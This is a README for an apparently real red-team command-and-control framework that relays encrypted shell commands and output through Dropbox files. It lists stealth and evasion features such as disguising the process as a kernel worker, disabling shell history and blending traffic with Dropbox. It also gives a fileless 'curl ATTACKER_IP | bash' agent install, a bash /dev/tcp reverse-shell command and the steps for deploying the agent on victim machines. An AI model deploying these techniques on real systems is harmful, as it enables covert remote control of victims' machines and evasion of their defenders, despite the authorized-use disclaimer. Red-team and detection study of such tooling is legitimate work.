# Dropbox Dead-Drop C2 (DDC)

![DDC Architecture](DDC_Image.jpg)

A **file-based Command & Control framework** that leverages **Dropbox** as a dead drop communication channel between controller and agent, using the official API with **hybrid encryption (RSA-4096 + AES-256-CBC)** for confidentiality and integrity.

Designed for red team operations, penetration testing, and security research purposes.

---

## 🧩 High-Level Architecture

The infrastructure consists of three main components:

- **Controller (Attacker)**
  - Scripts: `writer.sh`, `reader.sh`, `deployer.sh`
  - Holds **RSA private key** and Dropbox OAuth2 credentials
- **Dropbox Cloud (Dead Drop)**
  - Folder: `/Machine1/`
  - Files:
    - `input.txt` – encrypted commands for the agent
    - `output.txt` – encrypted output from the agent
    - `heartbeat.txt` – agent alive beacon (Unix timestamp)
- **Agent (Victim)**
  - Script: `agent.sh`
  - Contains:
    - **RSA public key** (obfuscated/split)
    - **APP_KEY, APP_SECRET, REFRESH_TOKEN** (base64 encoded)
  - Execution loop:
    - Update heartbeat
    - Download and decrypt command
    - Execute command
    - Encrypt and upload output

---

## 🚀 Key Features

- **File-based C2 via Dropbox**
  - Uses official `files/upload` and `files/download` API
- **Hybrid encryption**
  - **RSA-4096** for symmetric key protection/signing
  - **AES-256-CBC** with ephemeral keys for commands and output
- **Full shell capability**
  - Remote `eval` execution on agent
  - Supports reverse shells (add `&` for background detach)
- **Heartbeat and polling**
  - Periodic heartbeat with Unix timestamp
  - Configurable sleep + jitter to avoid predictable patterns
- **Automated deployment**
  - `deployer.sh` generates:
    - RSA keys (if not present)
    - OAuth2 config
    - `writer.sh`/`reader.sh` with correct Dropbox paths
    - `agent.sh` with embedded credentials

---

## 🕵️‍♂️ Evasion / Stealth Features

- **Legitimate service abuse**
  - C2 traffic is indistinguishable from normal Dropbox traffic (HTTPS/TLS)
- **Fileless / low-artifact**
  - Agent can be executed via:
    ```bash
    curl -s http://ATTACKER_IP:8000/agent.sh | bash
    ```
  - No dependencies except `bash`, `curl`, `openssl`
- **In-memory secrets**
  - Dropbox access token stored in memory, not on disk
  - Cleanup of sensitive variables on `EXIT`/`TERM`
- **Process masking**
  - Agent can rename process to mimic kernel worker:
    ```bash
    exec -a "[kworker/u:0]" bash "$0" ...
    ```
- **History disabled**
  - `unset HISTFILE`, `HISTSIZE=0`, no traces in bash history
- **Temporal jitter**
  - Random sleep around base value for unpredictable polling

> ⚠️ **Use only in authorized environments** (lab, authorized red team). Unauthorized use is illegal.

---

## 📐 Visual Architecture

```
┌─────────────────┐           ┌─────────────────┐           ┌─────────────────┐
│   CONTROLLER    │           │ DROPBOX CLOUD   │           │     AGENT       │
│  (Attacker)     │           │  (Dead Drop)    │           │   (Victim)      │
├─────────────────┤           ├─────────────────┤           ├─────────────────┤
│                 │           │  /Machine1/     │           │                 │
│  writer.sh   ─┐ │           │                 │           │  agent.sh       │
│  reader.sh    │ │           │  input.txt  🔒  │           │  [kworker/u:0]  │
│               │ │           │  output.txt 🔒  │           │                 │
│  🔑 RSA priv │ │           │  heartbeat.txt  │           │  🔓 RSA pub     │
│  🎫 OAuth2   │ │           │                 │           │  ⏱️  sleep+jitter│
│               │ │           │                 │           │                 │
└───────┬───────┘ │           └────────┬────────┘           └────────┬────────┘
        │         │                    │                             │
        │ ① UPLOAD COMMAND (RSA+AES)   │                             │
        └─────────┴───────────────────>│                             │
                                       │<────────────────────────────┘
                                       │  ② POLL & DOWNLOAD (HTTPS)
                                       │
                                       │────────────────────────────>
                                       │  ③ UPLOAD OUTPUT (RSA+AES)
        ┌──────────────────────────────┘
        │  ④ DOWNLOAD RESULT
        v
```

---

## ⏱️ Operational Timeline

```
t+0s    Controller: ./writer.sh "whoami"
        ├─ Generate AES-256 key + IV (random)
        ├─ Encrypt command with AES-256-CBC
        ├─ Sign AES credentials with RSA private key
        └─ Upload to Dropbox: input.txt (encrypted)

t+5s    Agent: Polling cycle starts
        ├─ Update heartbeat.txt (timestamp)
        └─ Download input.txt from Dropbox

t+7s    Agent: Command decryption
        ├─ Verify RSA signature with public key
        ├─ Extract AES key + IV
        ├─ Decrypt command with AES-256-CBC
        └─ Execute: bash -c "eval whoami"

t+8s    Agent: Output encryption
        ├─ Generate NEW AES-256 key + IV
        ├─ Encrypt output with AES-256-CBC
        ├─ Encrypt AES credentials with RSA public key
        ├─ Upload to Dropbox: output.txt (encrypted)
        └─ Reset input.txt to "MZ" marker

t+10s   Controller: ./reader.sh
        ├─ Download output.txt from Dropbox
        ├─ Decrypt AES credentials with RSA private key
        ├─ Decrypt output with AES-256-CBC
        └─ Display: "kali" (plaintext result)

t+35s   Agent: Sleep cycle (30s base + jitter)
        └─ Next polling cycle starts...
```

---

## 🔐 Cryptographic Flow

```
COMMAND PATH (Controller → Agent):
───────────────────────────────────
Plaintext: "whoami"
    ↓
[AES-256-CBC Encryption]
    ├─ Key: random 32 bytes (256-bit)
    ├─ IV:  random 16 bytes (128-bit)
    └─ Output: ciphertext_cmd
    ↓
[RSA-4096 Signature]
    ├─ Input: "aes_key:aes_iv"
    ├─ Sign with: private_key.pem
    └─ Output: signature
    ↓
Payload: base64(signature) + ":" + base64(ciphertext_cmd)
    ↓
[Upload to Dropbox] → input.txt


OUTPUT PATH (Agent → Controller):
──────────────────────────────────
Plaintext: "kali\n"
    ↓
[AES-256-CBC Encryption]
    ├─ Key: NEW random 32 bytes
    ├─ IV:  NEW random 16 bytes
    └─ Output: ciphertext_out
    ↓
[RSA-4096 Encryption]
    ├─ Input: "aes_key_out:aes_iv_out"
    ├─ Encrypt with: public_key.pem
    └─ Output: encrypted_credentials
    ↓
Payload: base64(encrypted_credentials) + ":" + base64(ciphertext_out)
    ↓
[Upload to Dropbox] → output.txt
```

---

## ⚙️ Technical Workflow

### 1. Command Path (Controller → Agent)

1. Operator runs:
   ```bash
   ./writer.sh "whoami"
   ```
2. `writer.sh`:
   - Generates `aes_key` (32 bytes) and `aes_iv` (16 bytes) random
   - Encrypts command with **AES-256-CBC**
   - Signs `aes_key:aes_iv` with **RSA private key**
   - Constructs payload:
     ```
     base64( RSA_sign(aes_key:aes_iv) ) : base64( AES_encrypt(command) )
     ```
   - Writes encrypted payload to `input.txt` via Dropbox API

3. Agent:
   - Downloads `input.txt` from Dropbox
   - Splits payload on `':'`
   - Verifies signature with **RSA public key**:
     - If valid, recovers `aes_key:aes_iv`
   - Decrypts command with AES-256-CBC
   - Executes via `bash -c "eval \"$command\""`

### 2. Output Path (Agent → Controller)

1. After execution, agent:
   - Generates **new** `aes_key_out`, `aes_iv_out` pair
   - Encrypts output with AES-256-CBC
   - Encrypts `aes_key_out:aes_iv_out` with **RSA public key**
   - Constructs payload:
     ```
     base64( RSA_encrypt(aes_key_out:aes_iv_out) ) : base64( AES_encrypt(output) )
     ```
   - Writes encrypted payload to `output.txt` on Dropbox
   - Resets `input.txt` to neutral marker (e.g., `MZ`)

2. Controller:
   - Downloads `output.txt` with `reader.sh`
   - Uses **RSA private key** to decrypt `aes_key_out:aes_iv_out`
   - Uses AES-256-CBC to decrypt output
   - Displays plaintext output in console

---

## 📦 Deployment

### 1. Prerequisites

- Linux (or WSL) with:
  - `bash`, `curl`, `openssl`, `sed`, `awk`
- Dropbox account with configured app:
  - `APP_KEY`, `APP_SECRET`, `REFRESH_TOKEN`

### 2. Repository Setup

```bash
git clone https://github.com/<your-username>/dropbox-deaddrop-c2.git
cd dropbox-deaddrop-c2
chmod +x deployer.sh
```

### 3. Generate C2 Package

Run:

```bash
./deployer.sh
```

During the wizard:

- Enter:
  - `APP_KEY`, `APP_SECRET`, `AUTHORIZATION_CODE`
- Choose:
  - Folder path (e.g., `/Machine1`)
  - File names (`input.txt`, `output.txt`, `heartbeat.txt`)
  - Timing parameters (sleep, jitter)

Final output (example):

```
deployment_YYYYMMDD_HHMMSS/
├── controller/
│   ├── private_key.pem
│   ├── public_key.pem
│   ├── .dropbox_refresh_token
│   ├── writer.sh
│   ├── reader.sh
│   └── README.txt
├── agent/
│   ├── agent.sh
│   └── README.txt
└── DEPLOYMENT_GUIDE.txt
```

---

## 🚚 Deployment Examples

### Controller (Attacker)

```bash
cd deployment_YYYYMMDD_HHMMSS/controller
chmod +x writer.sh reader.sh
```

### Agent – File on Disk

```bash
scp deployment_YYYYMMDD_HHMMSS/agent/agent.sh user@victim:/tmp/
ssh user@victim "chmod +x /tmp/agent.sh && /tmp/agent.sh"
```

### Agent – Daemon Mode (Detached)

```bash
ssh user@victim "bash /tmp/agent.sh -d -q"
```

### Agent – Fileless via HTTP

On controller:

```bash
cd deployment_YYYYMMDD_HHMMSS/agent
python3 -m http.server 8000
```

On victim:

```bash
curl -s http://ATTACKER_IP:8000/agent.sh | bash -s -- -d -q
```

---

## 💻 Command Examples

### Basic Commands

```bash
# whoami on victim
./writer.sh "whoami"
./reader.sh

# hostname
./writer.sh "hostname"
./reader.sh

# process list
./writer.sh "ps aux | head"
./reader.sh
```

### Filesystem Navigation

```bash
# list home directory
./writer.sh "ls -la ~"
./reader.sh

# read file
./writer.sh "cat /etc/os-release"
./reader.sh
```

### Reverse Shell (with background detach via `&`)

Assuming listener on controller:

```bash
nc -lvnp 4444
```

Send reverse shell (bash):

```bash
./writer.sh 'bash -i >& /dev/tcp/<_ip>/4444 0>&1 &'
```

> The trailing `&` ensures the reverse shell runs in background and doesn't block the agent loop.

### Terminate Agent

```bash
./writer.sh "EXIT"
./reader.sh   # optional, for confirmation
```

---

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## ⚠️ Legal Disclaimer

This tool is intended for **authorized security testing and educational purposes only**.

Unauthorized access to computer systems is illegal. The author assumes no liability and is not responsible for any misuse or damage caused by this software.

**Use responsibly and only on systems you own or have explicit permission to test.**

---

## 🛡️ Responsible Disclosure

If you discover security vulnerabilities in this framework, please report them responsibly. Do not use this tool for malicious purposes.

---

**Built for red teamers, by red teamers. Happy hacking! 🚀**
